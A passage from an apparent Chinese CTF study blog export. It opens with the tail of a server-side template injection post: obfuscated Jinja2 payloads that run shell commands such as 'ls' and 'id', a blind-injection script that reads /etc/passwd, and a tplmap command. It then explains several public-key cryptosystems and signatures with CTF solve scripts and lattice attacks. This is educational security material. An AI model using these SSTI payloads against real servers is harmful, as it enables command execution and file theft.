u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%&#125;&#123;&#123;u&#125;&#125; 1234567891011121314151617181920212223&#123;% set id=dict(ind=a,ex=a)|join%&#125;&#123;% set pp=dict(po=a,p=a)|join%&#125;&#123;% set ls=dict(ls=a)|join%&#125;&#123;% set ppe=dict(po=a,pen=a)|join%&#125;&#123;% set gt=dict(ge=a,t=a)|join%&#125;&#123;% set cr=dict(ch=a,r=a)|join%&#125;&#123;% set nn=dict(n=a)|join%&#125;&#123;% set tt=dict(t=a)|join%&#125;&#123;% set ff=dict(f=a)|join%&#125;&#123;% set ooqq=dict(o=a,s=a)|join %&#125;&#123;% set rd=dict(re=a,ad=a)|join%&#125;&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;&#123;% set shiba=five*five-three-three-one %&#125;&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;&#123;% set space=chcr(three*three*five-five-five-three) %&#125;&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125; 无回显 12345&#123;&#123;yyy.__init__.__globals__.__builtins__|attr(&#x27;__getitem_&#x27;)(&#x27;eval&#x27;)(&#x27;__import__(&quot;time&quot;).sleep(3) if open(&quot;/app/flag.txt&quot;).read()[0]==&quot;f&quot; else 1&#x27;)&#125;&#125;&#123;%if session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&#123;%include session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125; 盲注： 123456789101112131415161718import requestsfrom string import printable as pthost = &#x27;&#x27;res = &#x27;&#x27;for i in range(0,40): for c in pt: payload = &#x27;&#123;&#123;(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__[&quot;__builtins__&quot;][&quot;file&quot;](&quot;/etc/passwd&quot;).read()|string).index(&quot;%c&quot;,%d,%d)&#125;&#125;&#x27; % (c,i,i+1) param = &#123; &quot;name&quot;:payload &#125; req = requests.get(host,params=param) if req.status_code == 200: res += c break print(res) ​ 自动化工具tplmap: https://github.com/epinna/tplmap /tplmap.py --os-cmd -u &#39;http://www.target.com/page?name=John&#39; 参考文SSTI模板注入绕过（进阶篇） SSTI漏洞学习 (上)——基础知识和一些不常见的模板引擎介绍 ​ Python格式化字符串漏洞Python 格式化字符串漏洞（Django为例） ​ Payload参考Server Side Template Injection SSTI (Server Side Template Injection)","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"SSTI","slug":"SSTI","permalink":"https://lazzzaro.github.io/tags/SSTI/"}],"author":"Lazzaro"},{"title":"其他加密算法","slug":"crypto-其他加密算法","date":"2020-05-13T12:21:19.000Z","updated":"2022-12-15T16:56:34.646Z","comments":true,"path":"2020/05/13/crypto-其他加密算法/","link":"","permalink":"https://lazzzaro.github.io/2020/05/13/crypto-%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","excerpt":"","text":"​ GM（Goldwasser-Micali）同态加密Goldwasser-Micali (GM) 加密方案是第一个证明为 CPA 安全的公钥加密方案，其安全性依赖于从合数模的二次非剩余中区分二次剩余困难性假设。 密钥生成 用户随机生成两个大素数 $p$ 和 $q$，计算 $n=pq$，$z$ 是模 $n$ 的二次非剩余中的随机数。系统公钥 $pk=(n,z)$，系统私钥 $sk=(p,q)$。 加密 明文空间是 $\\{0,1\\}$，对于明文 $x\\in\\{0,1\\}$，加密方选取秘密随机数 $r\\in Z_n^{*}$，利用系统公钥 $pk$ 计算密文$E(x)=r^2z^x\\bmod n$。 解密 对于密文 $E(x)$，判断 $E(x)$ 是否为模 $n$ 的二次剩余，若 $E(x)$ 是模 $n$ 的二次剩余，则明文 $D(E(x))=0$； 若 $E(x)$ 不是模 $n$ 的二次剩余，则 $D(E(x))=1$。 GM加密系统的安全性是基于模 $n$ 的二次剩余问题。对于私钥的拥有者，知道大整数 $n$ 的因子分解，求解模 $n$ 的二次剩余问题是容易的；而对于攻击者，无法获知 $n$ 的因子分解，求解模 $n$ 的二次剩余问题是困难的，继而保证了该加密方案的安全性。 123456789101112from Crypto.Util.number import long_to_bytesimport gmpy2plaintext = &#x27;&#x27;with open(&#x27;output.txt&#x27;) as f: n = int(f.readline()) for line in f: cipher = int(line) if gmpy2.jacobi(cipher,n) == -1: plaintext += &#x27;1&#x27; else: plaintext += &#x27;0&#x27; print(long_to_bytes(int(plaintext,2))) ​ ElGamal加密ElGamal加密算法是一个基于迪菲-赫尔曼密钥交换的非对称加密算法。它在1985年由塔希尔·盖莫尔提出。GnuPG和PGP等很多密码学系统中都应用到了ElGamal算法。ElGamal加密算法可以定义在任何循环群G上。它的安全性取决于G上的离散对数难题。 密钥生成 随机选择一个满足安全要求的大素数 $p$，并生成有限域 $Z_{p}$。的一个生成元 $g\\in Z_{p}^{*}$； 选一个随机数 $x\\;(1&lt;x&lt;p-1)$，计算 $y\\equiv g^{x} \\pmod p$，则公钥为 $(y,g,p)$，私钥为 $x$。 加密 与RSA密码体制相同，加密时首先将明文比特串分组，使得每个分组对应的十进制数小于$p$，即分组长度小于$\\log_2p$，然后对每个明文分组分别加密。具体过程分为如下几步： 得到接收方的公钥 $(y,g,p)$； 把消息 $m$ 分组为长度为 $L\\;(L&lt;\\log_2 p)$ 的消息分组 $m=m_1m_2\\dots m_t$； 对第 $i$ 块消息 $(1\\leq i\\leq t)$ 随机选择整数 $r_i\\;(1&lt;r_i&lt;p-1)$； 计算 $c_i\\equiv g^{r_i}\\pmod p,\\;c_i^\\prime\\equiv m_iy^{r_i} \\pmod p\\;(1\\leq i\\leq t)$； 将密文 $C=(c_1,c_1^\\prime)(c_2,c_2^\\prime)\\dots(c_t,c_t^\\prime)$ 发送给接收方。 解密 接收方收到的密文 $C=(c_1,c_1^\\prime)(c_2,c_2^\\prime)\\dots(c_t,c_t^\\prime)$； 使用私钥 $x$ 和解密算法 $m_i \\equiv ({c_i^\\prime}({c_i^x})^{-1}) \\pmod p \\; (1\\leq i\\leq t)$ 进行计算； 得到明文 $m=m_1m_2\\dots m_t$。 ElGamal加密过程需要两次模指数运算和一次模乘积运算，解密过程需要模指数运算，求逆运算和模乘积运算各一次。每次加密运算需要选择一个随机数，所以密文既依赖于明文，又依赖于选择的随机数，故对于同一个明文，不同的时刻生成的密文不同。另外，ElGamal加密使得消息扩展了两倍，即密文的长度是对应明文长度的两倍。 ​ Paillier同态加密Paillier密码，于1999年由Pascal Paillier发明，是一种用于公钥加密的概率非对称算法。该算法具有加法同态的性质；这意味着，仅给出公钥和 $m_1,m_2$ 加密，可以计算出 $m_1 + m_2$ 。 密钥生成 随机选择两个大质数 $p,q$ 满足 $\\gcd(pq,(p-1)(q-1))=1$。此属性保证两个质数长度相等； 计算 $n=pq$ 和 $\\lambda=\\text{lcm}(p-1,q-1)$； 选择随机整数 $g(g\\in \\mathbb{Z}_{n^2}^{*}) $，使得满足 $n$ 整除 $g$ 的阶（$0\\lt g \\lt n^2$）； 定义 $L(x)=\\cfrac{x-1}{n}$； 计算 $\\mu=(L(g^\\lambda \\bmod n^2))^{-1} \\bmod n$； 公钥为 $(n,g)$，私钥为 $(\\lambda,\\mu)$。 简化版 $g=n+1$ $\\lambda=\\varphi(n)=(p-1)(q-1)$ $\\mu=\\varphi(n)^{-1}\\bmod n$ 加密 $m$ 为原文（$0\\leq m \\lt n$）； 选择随机数 $r(0 \\lt r \\lt n,r \\in \\mathbb{Z}_{n^2}^{*})$，且 $\\gcd(r,n)=1$； 加密：$c=g^m \\cdot r^n\\bmod n^2$。 解密 解密：$m=L(c^\\lambda \\bmod n^2)\\cdot \\mu \\bmod n$。 性质 $D(E(m_1,r_1) \\cdot E(m_2,r_2) \\bmod {n^2})=m_1+m_2 \\bmod n$ $D(E(m_1,r_1) \\cdot g^{m_2} \\bmod {n^2})=m_1+m_2 \\bmod n$ $D(E(m_1,r_1)^{m_2} \\bmod {n^2})=m_1m_2 \\bmod n$ $D(E(m_2,r_2)^{m_1} \\bmod {n^2})=m_1m_2 \\bmod n$ $D(E(m,r)^{k} \\bmod {n^2})=km \\bmod n$ $D(E(m,r) \\cdot (1+n)^k \\bmod {n^2})=m+k \\bmod n$ ​ Merkle-Hellman背包加密（Knapsack）1977年，Merkle与Hellman合作设计了使用背包算法，该算法提出后密码学界提出了很多背包型加密算法。 其工作原理是：假定甲想加密，则先产生一个较易求解的背包问题，并用它的解作为专用密钥；然后从这个问题出发，生成另一个难解的背包问题，并作为公共密钥。如果乙想向甲发送报文，乙就可以使用难解的背包问题对报文进行加密，由于这个问题十分难解，所以一般没有人能够破译密文；甲收到密文后，可以使用易解的专用密钥解密。 但是，在它发表几年后，就找到了攻破它的方法。即使如此，它仍然代表着一类很难问题的算法。 加密 选择任何一个超递增集 $\\{s_1,s_2,…,s_n\\}$。 陷门由任意大于 $\\sum_{i}s_i$ 的素数 $p$ 和任意小于 $p$ 的整数 $p$ 组成，这两个数和集合 $\\{s_1,s_2,…,s_n\\}$ 都是保密的。 公开的整数集是 $\\{t_1,t_2,…,t_n\\}$ ，其中 $t_i=a_i \\cdot s_i \\pmod p$。 二进制明文 $(b_1,b_2,…,b_n)$ 的加密操作为 $y=\\sum_{i}b_it_i$，整数 $y$ 是密文。 解密 找到 $a^{-1} \\pmod p$。因为 $p$ 是质数， $a^{-1} \\pmod p$ 一定存在。计算 $a^{-1}y \\pmod p$。 得到 $a^{-1}y \\pmod p$ 这使得： $a^{-1}y=a^{-1}\\sum_{i}b_it_i \\pmod p=\\sum_{i}b_i(a^{-1}as_i) \\pmod p=\\sum_{i}b_is_i$ 因为集合 $\\{s_1,s_2,…,s_n\\}$是超递增集，所以很容易定位明文位。 ★注： Knapsack系统的密度为： $d = \\cfrac{n}{\\log_2(max\\{a_i\\})}$ 基于子集和问题，MH密码系统是最开始出现的一种密度比较低的Knapsack密码系统。很快Shamir等人提出了一系列的攻击方式，包括丢番图逼近，LLL等方法（$d&lt;0.9408$）。虽然这个密码系统被攻破了，新的Knapsack系统诞生了，这种密码系统的密度变高了，$a_i$ 值变小了，而且加密的明文的二进制位中1的数量也很小。 新的密码系统更加难以破解，也称之为HardKnapsack系统，不过后来密码学家们还是发现了攻击方法，我们称之为low-weight attack。 Schroeppel-Shamir Algorithm 时间复杂度,空间复杂度均为 $O(\\cfrac{n}{2})$ The Howgrave-Graham–Joux Algorithm 时间复杂度 $O(0.337n)$，空间复杂度 $O(0.256n)$ 总体来说，这两种算法是基于分治和mitm的思想进行攻击的。 Lagarias and Odlyzko’s Method / CJLOSS Method 参考：Lattice Reduction Attack on the Knapsack Type Cryptosystem 构造格： $\\left(\\begin {array}{c} b_0 \\newline b_1 \\newline \\vdots \\newline b_n \\newline b_{n+1} \\end{array} \\right) =\\left(\\begin {array}{c} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_0 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; Nk_1 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; Nk_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_{n+1} \\end{array} \\right) $ 12345678910111213141516M = Matrix.identity(n)last_row = [0 for x in keys]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)ct = last_col = keys[:]last_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.LLL()target = X[0][:-1]ans = [-k for k in target] 对于密度比较高的Knapsack密码系统，在1的数量确定情况下，可以尝试分段爆破。 参考论文：Improved Generic Algorithms for Hard Knapsacks 常规解密脚本 12345678910111213141516171819202122232425262728293031323334353637383940from sage.all import *pk = # public keyct = # ciphertextprint(ct)print(len(pk))n = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = solprint(s) 泄露部分明文空间的降维处理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758###Sagepubkey = [...] c = #前缀 flag&#123;prefix = [int(_) for _ in bin(bytes_to_long(b&#x27;flag&#123;&#x27;))[2:]]for i in range(len(prefix)): c -= prefix[i] * pubkey[i]#后缀 &#125;suffix = [int(_) for _ in bin(ord(&#x27;&#125;&#x27;))[2:].rjust(8, &#x27;0&#x27;)]n = len(pubkey)for i in range(8): c -= pubkey[n - 8 + i] * suffix[i]#中部md5范围 0-felements = []for i in range(len(prefix), len(pubkey) - 8, 8): elements.append(pubkey[i + 1]) c -= 1 * pubkey[i + 2] for j in range(3, 8): elements.append(pubkey[i + j]) n = len(elements)A = Matrix(ZZ, n + 1, n + 1)for i in range(n): A[i, 0] = elements[i] A[i, i + 1] = 2A[n, 0] = cfor i in range(1, n + 1): A[n, i] = 1AL = A.BKZ()mid = Nonefor line in AL: if all(line[i] == 1 or line[i] == -1 for i in range(1, n + 1)): if line[1] == 1: line = -line mid = line[1:] breakmid_str = &#x27;&#x27;for _ in mid: if _ == -1: mid_str += &#x27;0&#x27; else: mid_str += &#x27;1&#x27;flag = &#x27;&#x27;j = 0for i in range(32): flag += &#x27;0&#x27; flag += mid_str[j] j += 1 flag += &#x27;1&#x27; for k in range(5): flag += mid_str[j] j += 1print(bytes.fromhex(hex(int(flag, 2))[2:])) 子集合问题 转化为 求解SVP/CVP+Lattice Reduction Algorithm 参考： WMCTF 2020 - babySum + Sum Crypto Research: Solving Subset Sum Problem by Lattice Reduction 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import reimport randomimport multiprocessing as mpfrom functools import partialdef check(sol, A, s): &quot;&quot;&quot;Check whether *sol* is a solution to the subset-sum problem. &quot;&quot;&quot; return sum(x*a for x, a in zip(sol, A)) == s def solve(A, n, k, s, ID=None, BS=22): N = ceil(sqrt(n)) # parameter used in the construction of lattice rand = random.Random(x=ID) # seed # 1. Construct the lattice # (n+1) * (n+2) # 1 0 ... 0 a_0*N N # 0 1 ... 0 a_1*N N # . . ... . ... . # 0 0 ... 1 a_n*N N # 0 0 ... 0 s*N k*N lat = [] for i, a in enumerate(A): lat.append([1*(j == i) for j in range(n)] + [N*a] + [N]) lat.append([0]*n + [N*s] + [k*N]) # main loop itr = 0 start_time = cputime() while True: itr += 1 # 2. Randomly shuffle l = lat[::] shuffle(l, random=rand.random) # 3. BKZ!!! m = matrix(ZZ, l) t_BKZ = cputime() m_BKZ = m.BKZ(block_size=BS) print(f&quot;n=&#123;n&#125; &#123;itr&#125; runs. BKZ running time: &#123;cputime(t_BKZ):.3f&#125;s&quot;) # 4. Check the result for i, row in enumerate(m_BKZ): if check(row, A, s): if row.norm()^2 == k: print(f&quot;n=&#123;n&#125; After &#123;itr&#125; runs. FIND SVP!!! &#123;row&#125;\\n&quot; f&quot;Single core time used: &#123;cputime(start_time):.3f&#125;s&quot;) return Trues = A = []#choose k numbers from nk = n = solve_n = partial(solve, A, n, k, s)CPU_CORE_NUM = 8with mp.Pool(CPU_CORE_NUM) as pool: reslist = pool.imap_unordered(solve_n, range(CPU_CORE_NUM)) # terminate all processes once one process returns for res in reslist: if res: pool.terminate() break ​ Benaloh加密 密钥生成 假定块大小为 $r$，每个明文信息块大小在 $[0,r)$ 范围内。 选择两个大质数 $p=rp’+1$ 和 $q$ ，满足 $\\gcd(p’,r)=\\gcd(q-1,r)=1$； 计算 $n=pq$ 及 $\\varphi(n)=(p-1)(q-1)$； 选择 $0 \\leq y \\lt n$，满足 $y^{\\varphi(n)/r} \\not\\equiv 1 \\pmod n$； 计算 $x=y^{\\varphi(n)/r} \\bmod n$，公钥为 $(y,n)$，私钥为 $(\\varphi,x)$。 加密 假设要加密的信息 $m \\in [0,r)$： 选择一个数 $u \\in [0,n)$； 计算 $c=y^mu^r \\bmod n$ 即为 $m$ 的密文。 解密 假设要解密的信息 $c$： 计算 $a=c^{\\varphi(n)/r} \\bmod n$； DLP求解满足 $x^m \\equiv a \\pmod n$ 的 $m$，即 $m=\\log_x(a)$。 参考 https://mystiz.hk/posts/2021-02-15-dicectf-1/ 123456789101112131415161718192021222324252627282930from Crypto.Util.number import long_to_bytesfrom tqdm import tqdmn = y = e = C = []p = q = phi = (p-1) * (q-1)tmp = phi // ebounds = (1, e)F = IntegerModRing(n)result = []x = F(pow(y, tmp, n))for c in tqdm(C): a = F(pow(c, tmp, n)) result.append(bsgs(x, a, bounds))flag = 0for i in result[::-1]: flag = flag*e + iflag = long_to_bytes(flag)print(flag) ​ LUC-RSA加密 Lucas数列（卢卡斯数列） 递推关系 给定两个整数 $P$ 和 $Q$，满足：$P^2-4Q \\ne 0$， 第一类卢卡斯数列 $U_n(P,Q)$ 定义： $U_0(P,Q)=0 \\\\ U_1(P,Q)=1 \\\\ U_n(P,Q)=P \\cdot U_{n-1}(P,Q) - Q \\cdot U_{n-2}(P,Q), n&gt;1$ 第二类卢卡斯数列 $V_n(P,Q)$ 定义： $V_0(P,Q)=2 \\\\ V_1(P,Q)=P \\\\ V_n(P,Q)=P \\cdot V_{n-1}(P,Q) - Q \\cdot V_{n-2}(P,Q), n&gt;1$ 代数关系 特征方程：$x^2-Px+Q=0$，判别式：$D=P^2-4Q$，根：$a=\\cfrac{P+\\sqrt{D}}{2},b=\\cfrac{P-\\sqrt{D}}{2}$。 卢卡斯数列的项可用 $a$ 和 $b$ 的项定义： $U_n = \\cfrac{a^n-b^n}{a-b} = \\cfrac{a^n-b^n}{\\sqrt{D}}$ $V_n = a^n + b^n$ 密钥生成 设 $p,q$ 是两个奇素数，$N=pq$。 $e \\in \\mathbb{Z}_N$，且 $\\gcd(e,(p-1)(p+1)(q-1)(q-1))=1$。 卢卡斯数列 $V_n(M,1) = M \\cdot V_{n-1} - V_{n-2}$，即 $P=M,Q=1$。（更一般情况见paper） 公钥为：$(N,e)$。 加密 $C=V_e(M,1) \\pmod N$，对任意信息 $M \\in \\mathbb{Z}_N$。 解密 解密密钥 $d$，$ed \\equiv 1 \\pmod {S(N)}$， $S(N)=\\text{lcm}\\left(p-\\left (\\cfrac{D}{p} \\right),p-\\left (\\cfrac{D}{q} \\right)\\right)$，$D=C^2-4$， 其中 $\\left(\\cfrac{D}{p} \\right)= \\begin{cases} 1,&amp; \\exists x, x^2 \\equiv D \\pmod {p} \\\\ 0,&amp; p \\mid D \\\\ -1, &amp; \\text{other} \\end{cases}$ 为勒让德(Legendre)符号。 $M=V_d(C,1) \\pmod N$。 参考 一种新的基于 Lucas 序列的公钥密码体制 LUC: A New Public Key System UMassCTF 2021 - Weird RSA LUC-RSA: A new attack on three variants of the RSA cryptosystemCryptanalysis of RSA-type cryptosystems based on Lucas sequences, Gaussian integers and elliptic curves HFCTF 2022 - RRSSAA RCTF 2022 - easyRSA 1234567891011121314151617181920212223242526272829303132333435363738394041#法1，快速矩阵幂from Crypto.Util.number import long_to_bytesN=C=def ffm(num): # Fermat&#x27;s Factorization Method. if num%2==0: return (2,num/2) a=ceil(sqrt(num)) c=a**2-num while is_square(c)==0: a+=1 b=sqrt(c) return (a-b,a+b)def matpow(mat,power): # Matrix Square-And-Multiply Exponentiation. power_rep=bin(power)[3:] result=mat pcnt=1 for i in power_rep: result=result*result pcnt*=2 if i==&#x27;1&#x27;: result=mat*result pcnt+=1 print(pcnt) return resultdef decrypt(d): # Decryption. Mat=Matrix(Zmod(N),[[C,-1],[1,0]]) ori=vector(Zmod(N),[C,2]) return matpow(Mat,d-1)*orip,q=ffm(N) assert p*q==ND=(C**2-4)%Np_leg,q_leg=int((p-kronecker(D,p))%N),int((q-kronecker(D,q))%N)tn=lcm((p_leg),(q_leg))d=inverse_mod(0x10001,tn)assert (0x10001*d)%tn==1decc,_=decrypt(d)print(long_to_bytes(decc)) 1234567891011#法2，存储vd#vd(2n)=vd(n)^2-2#vd(2n+1)=c*vd(n)^2-vd(n)*vd(n-1)+cdef v(n): if n == 0: return 2 if n == 1: return c if n in v_dict.keys(): return v_dict[n] if(n % 2 == 0): ret = (pow(v(n // 2), 2, N) - 2) % N else: ret = (c * pow(v(n // 2), 2, N) - v(n // 2) * v((n // 2) - 1) - c) % N v_dict[n] = ret return ret 12345678910111213#法3，William&#x27;s p+1算法优化vd# Williams&#x27;s p + 1 algorithmdef LUC(c, d, N): x = c y = (c**2 - 2) % N for bit in bin(d)[3:]: if bit == &#x27;1&#x27;: x = (x*y - c) % N y = (y**2 - 2) % N else: y = (x*y - c) % N x = (x**2 - 2) % N return x ​ DSA数字签名 密钥生成 选择一个合适的哈希函数，目前一般选择SHA1，也可以选择强度更高的哈希函数 $H$； 选择密钥的长度 $L$ 和 $N$，这两个值决定了签名的安全程度。在最初的DSS（Digital Signature Standard ）中建议 $L$ 必须为64的倍数，并且 $512≤L≤1024$，当然也可以更大。$N$ 大小必须不大于哈希函数 $H$ 输出的长度。FIPS 186-3给出了一些建议的 $L$ 和 $N$ 的取值例子：$(1024, 160),(2048, 224), (2048, 256),(3072, 256)$。 选择 $N$ 比特的素数 $q$； 选择 $L$ 比特的素数 $p$，使得 $p-1$ 是 $q$ 的倍数； 选择满足 $g^k \\equiv 1 \\pmod p$ 的最小正整数 $k$ 为 $q$ 的 $g$，即在模 $p$ 的背景下，$\\mathrm{ord}(g)=q$ 的 $g$。即 $g$ 在模 $p$ 的意义下，其指数次幂可以生成具有 $q$ 个元素的子群。这里可以通过计算 $g \\equiv h^{\\frac{p−1}{q}} \\pmod p$ 来得到 $g$，其中 $h \\in (1,p−1)$ 。 选择私钥 $x \\in (0,q)$，计算 $y \\equiv g^x \\pmod p$。 公钥为 $(p,q,g,y)$，私钥为 $(x)$。 签名 选择随机整数数 $k \\in (0,q)$ 作为临时密钥； 计算 $r \\equiv (g^k \\bmod p) \\pmod q$； 计算 $s \\equiv (H(m)+xr)k^{-1} \\pmod q$。 签名结果为 $(r,s)$。需要注意的是，这里使用了哈希函数对消息进行了哈希处理。 验证 计算辅助值 $w \\equiv s^{-1} \\pmod q$； 计算辅助值 $u_1 \\equiv H(m)\\cdot w \\pmod q$； 计算辅助值 $u_2 \\equiv r\\cdot w \\pmod q$； 计算 $v \\equiv (g^{u_1}y^{u_2} \\bmod p) \\pmod q$； 如果 $v$ 与 $r$ 相等，则校验成功。 攻击 $k$ 复用（共享 $k$） 如果在两次签名的过程中共享了 $k$，就可以进行攻击。 假设签名的消息为 $m_1,m_2$，显然两者的 $r$ 的值一样，此外 $s_1 \\equiv (H(m_1)+xr)k^{-1} \\pmod q$ $s_2 \\equiv (H(m_2)+xr)k^{-1} \\pmod q$ 这里除了 $x$ 和 $k$ 不知道剩下的均知道，联立有 $k(s_1-s_2) \\equiv (H(m_1)-H(m_2)) \\pmod q$， 此时即可解出 $k$，进一步可以解出 $x$。 $k$ 部分泄露 参考：Recovering cryptographic keys from partial information, by example ​ Elgamal数字签名 密钥生成 选取一个足够大的素数 $p$（十进制位数不低于160），便于在 $\\mathbb{Z}_p$ 上求解DLP是困难的； 选取生成元 $g \\in (0,p)$； 随机选取整数 $d \\in [0,p-2]$，并计算 $g^d \\equiv y \\pmod p$； 公钥为 $(p,g,y)$，私钥为 $(d)$。 签名 A选取随机数 $k \\in (0,p-1)$，且 $\\gcd(k,p-1)=1$，对消息进行签名： $\\mathrm{sig}(m,k)=(r,s)$ 其中： $r \\equiv g^k \\pmod p$ $s \\equiv (m-dr)k^{-1} \\pmod {p-1}$。 验证 如果 $g^m \\equiv y^rr^s \\pmod p$，那么验证成功，否则验证失败。 攻击 $k$ 复用（共享 $k$） 如果签名者复用了随机数 $k$ ，那么攻击者就可以轻而易举地计算出私钥。 假设目前有两个签名都是使用同一个随机数进行签名的。那么有： $r \\equiv g^k \\pmod p$ $s_1 \\equiv (m_1-dr)k^{-1} \\pmod {p-1}$ $s_2 \\equiv (m_2-dr)k^{-1} \\pmod {p-1}$, 进而有 $k(s_1-s_2) \\equiv (m_1-m_2) \\pmod {p-1}$， $s_1,s_2,m_1,m_2,p$ 均已知，容易算出 $k$，进而根据 $s$ 的计算方法得到私钥 $d \\equiv (m-ks)r^{-1} \\pmod {p-1}$。 构造验证 单参数 选择 $e \\in (1,p-1)$，令 $r=g^ey \\bmod p$，$s=-r \\bmod (p-1)$，有 $m=es \\bmod (p-1)$ 满足验证。 双参数 选择 $e,v \\in (1,p-1),\\gcd(v,p-1)=1$，令 $r=g^ey^v \\bmod p$，$s=-rv^{-1} \\bmod (p-1)$，有 $m=es \\bmod (p-1)$ 满足验证。 ​ Shamir密钥分享算法Shamir 密钥分享算法最早是由 Shamir 和 Blackly 在 1970 年基于 Lagrange 插值和矢量方法提出的。 算法有 2 个重要参数：$k$ 和 $n$。$n$ 表示将明文加密为 $n$ 个 $\\text{Shadow}$，$k$ 表示 至少需要 $k$ 个 $\\text{Shadow}$ 才可以恢复出明文。 加密 若明文为 $s$，$s \\in \\mathbb{Z}_p$，$p$ 为一个大素数。在 $\\text{GF}(p)$ 任取 $k-1$ 个随机数： $a_1,a_2,\\cdots,a_{k-1}$，构造如下多项式： $f(x)=s+a_1x+a_2x^2+\\cdots+a_{k-1}x^{k-1} \\pmod p$ 任取 $n$ 个不同的数：$x_1,x_2,\\cdots,x_n$，分别代入多项式得到 $n$ 个密钥对： $(x_1,f(x_1)),(x_2,f(x_2)),\\cdots,(x_n,f(x_n))$ 将这 $n$ 个密钥对分发给 $n$ 个持有者。 解密 得到了 $n$ 个密钥对 $(x_1,f(x_1)),(x_2,f(x_2)),\\cdots,(x_n,f(x_n))$ 后，可以列出以下在 $\\text{GF}(p)$ 上的方程组： $\\left\\{\\begin{array}{c} s+a_1x_1+a_2x_1^2+\\cdots+a_{k-1}x_1^{k-1}=f(x_1) \\\\ s+a_1x_2+a_2x_2^2+\\cdots+a_{k-1}x_2^{k-1}=f(x_2) \\\\ \\vdots \\\\ s+a_1x_n+a_2x_n^2+\\cdots+a_{k-1}x_n^{k-1}=f(x_n) \\end{array}\\right.$ 然后就可用 Lagrange 插值算法求出 $s$ 了。 12345#python-1from sslib import shamirdata = &#123;&#x27;required_shares&#x27;: 2, &#x27;prime_mod&#x27;: &#x27;AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEp&#x27;, &#x27;shares&#x27;: [&#x27;1-MEwx7cz+C01rL8H0Hhz2EIgHjWYXVcL81uITmRha674=&#x27;, &#x27;2-YJhj22+ntS1s80CT9b6Y7ayc52baTFGNRpPUyLxtaf8=&#x27;, &#x27;3-4SRZDcshiZTVRJ7nVY8NDq83JOsnZtPm&#x27;, &#x27;4-wTDHtrT7CO1wej3TpQHep/XHm2hgOW6uJfdXKASSZoE=&#x27;, &#x27;5-8Xz5pFekss1yPbxzfKOBhRpc9WkjL/0+lakYV6ik5MI=&#x27;]&#125;print(shamir.recover_secret(shamir.from_base64(data)).decode(&#x27;ascii&#x27;)) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#python-2from Crypto.Util.number import *import gmpy2def product(vals, p): return reduce(lambda x, y: x * y % p, vals)def lagrange_interpolate(x, x_s, y_s, p): n = len(x_s) assert n == len(set(x_s)) # x_s must be distinct num = [] den = [] for i in range(n): others = x_s[:i] + x_s[i+1:] num.append(product((x - o for o in others), p)) den.append(product((x_s[i] - o for o in others), p)) dens = product(den, p) res = 0 for i in range(n): tmp1 = ((num[i] * dens % p) * y_s[i]) % p tmp2 = tmp1 * gmpy2.invert(den[i], p) % p res = (res + tmp2) % p res = res * gmpy2.invert(dens, p) % p return resdef shamir_sharing_encode(s, k, n, p): a = [getRandomInteger(Nbits) for _ in range(k-1)] res = [] for _ in range(n): x = getRandomInteger(Nbits) fx = s for i in range(k-1): fx = (fx + a[i] * pow(x, i+1, p)) % p res.append((x, fx)) return resdef shamir_sharing_decode(shares, p): x_s, y_s = zip(*shares) return lagrange_interpolate(0, x_s, y_s, p)Nbits = 1024secret = bytes_to_long(&#x27;it_is_the_top_secret&#x27;)p = getPrime(Nbits)k = 513n = 513shares = shamir_sharing_encode(secret, k, n, p)s = shamir_sharing_decode(shares, p)print long_to_bytes(s)# 2s 1234567891011121314151617181920212223#SageP = PolynomialRing(GF(p), &#x27;x&#x27;)ret = P(0)for x, y in shares: r = P(1) * y for xx, yy in shares: if x != xx: r = r * P((0 - xx) / (x - xx)) 